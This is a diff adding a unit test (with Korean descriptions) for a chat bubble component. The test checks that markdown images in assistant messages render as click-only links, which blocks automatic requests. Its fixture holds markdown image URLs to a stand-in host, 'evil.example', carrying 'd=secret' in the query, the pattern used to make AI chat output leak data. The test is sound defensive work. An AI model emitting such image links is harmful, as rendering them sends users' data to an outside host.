@@ -42,6 +42,24 @@ describe('ChatBubble', () => {
     expect(w.text()).toContain('<script>x</script>')
   })
 
+  it('assistant 말풍선의 마크다운 이미지는 <img> 없이 클릭해야 열리는 링크로 그린다 (자동 요청 차단)', () => {
+    const w = mount(ChatBubble, {
+      props: {
+        role: 'assistant',
+        content: '참고: ![구성도](https://evil.example/x.png?d=secret)\n\n![r]\n\n[r]: https://evil.example/r.png',
+      },
+    })
+    expect(w.find('img').exists()).toBe(false)
+    const links = w.findAll('.bubble.assistant a.md-image-link')
+    expect(links.map((a) => a.attributes('href'))).toEqual([
+      'https://evil.example/x.png?d=secret',
+      'https://evil.example/r.png',
+    ])
+    expect(links[0]!.attributes('target')).toBe('_blank')
+    expect(links[0]!.attributes('rel')).toBe('noopener noreferrer')
+    expect(links[0]!.text()).toBe('[이미지] 구성도')
+  })
+
   it('user 말풍선은 마크다운을 해석하지 않고 평문으로 보여준다', () => {
     const w = mount(ChatBubble, {
       props: { role: 'user', content: '**굵게** 아님' },
